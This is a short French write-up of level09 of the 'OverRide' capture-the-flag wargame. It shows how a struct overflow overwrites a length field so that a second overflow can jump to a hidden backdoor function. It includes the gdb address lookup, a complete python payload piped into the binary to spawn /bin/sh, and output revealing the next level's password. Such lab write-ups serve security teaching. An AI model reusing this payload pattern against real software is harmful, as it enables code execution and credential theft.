En desassemblant le code et en le reconstuisant on constate avec un "i func" qu'il y a une backdoor dans le code qui nous permet d'executer la commande bash que l'on souhaite.

On va essayer d'y acceder.

La sturcture composé de :

```C
struct user
{
        char    msg[140];
        char    name[40];
        int     n;
};
```
Nous permet d'écraser n si on overflow name avec 41 octets.

Si on change n avec la plus haute valeur possible \xff on pourra overflow le msg de 140 pour pouvoir acceder a la fonction secret_backdoor.


```gdb
(gdb) p secret_backdoor
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
(gdb)
```

address de secret_backdoor -> 0x55555555488c


```bash
level09@OverRide:~$ (python -c "print('B'*40 + '\xff' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh')"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```